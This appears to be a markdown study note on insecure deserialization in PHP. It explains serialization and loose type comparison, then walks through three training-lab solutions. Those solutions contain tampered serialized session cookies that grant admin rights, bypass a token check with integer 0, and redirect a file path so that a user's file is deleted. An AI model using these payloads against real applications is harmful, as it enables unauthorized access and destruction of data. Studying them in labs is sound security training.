# Insecure deserialization


- <details>
     <summary>What is serialization?</summary>

     ## What is serialization?
     
     
     **Serialization** is the process of converting complex data structures, such as objects and their fields, into a "flatter" format that can be sent and received as a sequential stream of bytes. Serializing data makes it much simpler to:
     
     -   Write complex data to inter-process memory, a file, or a database
     -   Send complex data, for example, over a network, between different components of an application, or in an API call
     
     Crucially, when serializing an object, its state is also persisted. In other words, the object's attributes are preserved, along with their assigned values.
     



     
</details>




<details>
     <summary>Deserialization</summary>


![image](https://dock12.sorint.com/images/19-04-2023/deserialization-diagram.jpg)


## **`Serialized Data`**


From **`Object`** → **`String`**

> ### you will see in reqest 


## **`DeSerialized Data`**

From **`string`** → **`Object`**

> ### you don't see it it's in server



----


❗ Example showing the picture:
===================

🎯 Before Serialization (Object in the server):
-----------------------------------------


```js
array(
  "id" => 10,
  "admin" => true
)
```


🎯 After Serialization (string appears as Cookie):
------------------------------------------------

```java
a:2:{s:2:"id";i:10;s:5:"admin";b:1;}
```


🔥 Here **string → Serialized**\
🔥 Once the server receives it and returns it, Object → **Deserialized** (and you will not see it)



----

> ### Example on json

**`Object`**

```js
const user = { name: "frank", role: "user" };
```

**`String`**

```json
{"name":"frank","role":"user"}
```


This is **Serialized JSON string**\
It means just **Text** not Object.

In order to return Object, you must do:

```js
let obj = JSON. parse('{"name":"frank","role":"user"}');
```

And vice versa:

```js 
JSON.stringify({ name: "frank", role: "user" });
```



---

---



🎯 The real question:

===================

**How ​​do I know that the site is deserializing the data I see?**

======================================================================================

Answer yourself with 3 questions:

❓ 1) Does the data you see look serialized?

-----------------------------------------

If yes → there is a high probability that the site will deserialize.

❓ 2) Is the data listed in Cookie/Request and changed when I log in?

--------------------------------------------------------------

If Ah → This is Session Serialization.

❓ 3) If I changed the value... the site had different behavior?

------------------------------------------------------

like:

-   I remained admin

- An error occurred

- There was a crash

-   Logging out happened

If Ah → then it really does **deserialization**.










     
     
</details>


<details>
     <summary>Modifying data types</summary>


1) A quick background on Loose Comparison in PHP

=============================================

-   PHP, when you compare two values ​​using `==` (non-strict comparison or **Loose Comparison**), tries to convert the types to each other if they differ.

-   A simple example:

`5 == "5"  // true  `

Because PHP converts string `"5"` to an integer 5 before comparing.

* * * * *


2) A very important point:

==================

If a string begins with a number and is followed by letters, PHP **converts** all the text to just the first number and ignores the rest.

example:

`5 == "5 of something"  // true  `

Because PHP converts `5 of something` → only the number 5, and 5 == 5 is true.


3) Strange case in PHP 7.x and below:
==============================

`0 == "Example string" // true `

This is because PHP converts the string that does not start with a number to 0 digitally!\
In PHP 8 this statement was changed and is now `false`.


4) How is this related to Insecure Deserialization?
===============================================

If there is a code like this:

`$login = unserialize($_COOKIE['login']); if ($login['password'] == $password) { // Allow login } `

* * * * *

Scenario:
----------

- The server expects `password` to be a string (eg "mypassword").

- The attacker changes the cookie and sends a serialized object with `password` as 0 (integer).

- When the server unserializes, the following happens:

`$login['password'] = 0; // Type int, not string `

-And the comparison here:

`0 == "mypassword"`

In PHP 7.x and lower → **equals true**!\
Because `"mypassword"` turns to 0.

* * * * *

The result?
========

The attacker is able to bypass the password **due to a weakness in the non-strict comparison**, which appears because:

- The deserialization returns the original type (int 0) and not string.

- The code depends on the comparison `==`, which converts types.

* * * * *

5) Important notes:
================

- If the code takes the password directly from the request (for example from POST) as a string, instead of taking it from the object after unserialize, the condition will be:

`"0" == "mypassword" // false `

Because the two types and string are different.


8) A final point about modifying data in a serialized string
====================================================

If you change a data type from string to int in a serialized string, you must modify the length of the string and the number of characters associated with the data type in serialized, otherwise unserialize will fail.

for example:

`s:4:"1234"; // string length is 4`

If you convert it to an integer:

`i:1234; // int, no length ` is required

You must be precise for unserialize to work.








     
</details>

















































---

# **`Labs`**




<details>
  <summary>Lab: Modifying serialized objects `php 7.x` </summary>

1. login as `wiener`
2. intercept the request of `/my-account`

<img width="707" height="621" alt="image" src="https://github.com/user-attachments/assets/4277d372-f554-4646-8b6e-ea389fb9d546" />

```
Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30%3d
```

3. send cookie to decoder found

```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}%3d
```

4. now try to change **`b:0`** to **`b:1`** from false to true
 
<img width="1460" height="634" alt="image" src="https://github.com/user-attachments/assets/f1465f17-e624-4fa0-8456-fbb483a8a3c2" />

```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}%3d
```

<img width="1102" height="428" alt="image" src="https://github.com/user-attachments/assets/b6e40c36-3938-4f69-89d6-0815ba9c3fd9" />

5. now visit admin panal and delete carlos

```
/admin/delete?username=carlos
```

<img width="1421" height="793" alt="image" src="https://github.com/user-attachments/assets/cef09826-e1ec-41af-af50-7804bb31a5a6" />


  
</details>


<details>
     <summary>Lab: Modifying serialized data types</summary>


1. login as **`wiener`**
2. look at the cookie after login 

<img width="1910" height="860" alt="image" src="https://github.com/user-attachments/assets/d56998c4-ec23-4d1e-9dee-04478a69910f" />

```json
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"wunlak899krb4ov0lwgbhct6jx8u5ya2";}
```

3. now  and 

- change `wiener` to `administrator`
- change **`s:6`** to **`s:13`**
- change `s:32:"wunlak899krb4ov0lwgbhct6jx8u5ya2"` To `i:0`


```json
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
```


> ## now server will compare the admin token which is stirng with `0` and because this is `php 7` it will  

```
# if token of admin is "kjhsafdkjasdhfjkajkdf"

0 == "kjhsafdkjasdhfjkajkdf" // true

```

<img width="1629" height="703" alt="image" src="https://github.com/user-attachments/assets/7b2fca8c-fef7-4a79-8b44-4bc6e76fb778" />

4. now send request

```http
/admin/delete?username=carlos
```

<img width="1536" height="693" alt="image" src="https://github.com/user-attachments/assets/877ff803-3b99-4048-8300-a1b631ca7e62" />




     
</details>






<details>
     <summary>Lab: Using application functionality to exploit insecure deserialization</summary>


1. login as `wiener`
2. look at `cookie`


<img width="1872" height="699" alt="image" src="https://github.com/user-attachments/assets/ddf98426-6e5d-4d03-a724-a6792a3c484b" />


```
O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"e7wnsqdqe9j3kew3t81j1y6v04ljlb3x";s:11:"avatar_link";s:19:"users/wiener/avatar";}
```

3. wen want to delete **`/home/carlos/morale.txt`** we will :

- change **`avatar_link`** To **`/home/carlos/morale.txt`**
- after that delete the account

```
O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"e7wnsqdqe9j3kew3t81j1y6v04ljlb3x";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}
```

```
Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJlN3duc3FkcWU5ajNrZXczdDgxajF5NnYwNGxqbGIzeCI7czoxMToiYXZhdGFyX2xpbmsiO3M6MjM6Ii9ob21lL2Nhcmxvcy9tb3JhbGUudHh0Ijt9
```



<img width="1797" height="703" alt="image" src="https://github.com/user-attachments/assets/5d70c367-abd9-4fb3-a67d-9d434d635ef5" />




     
</details>



















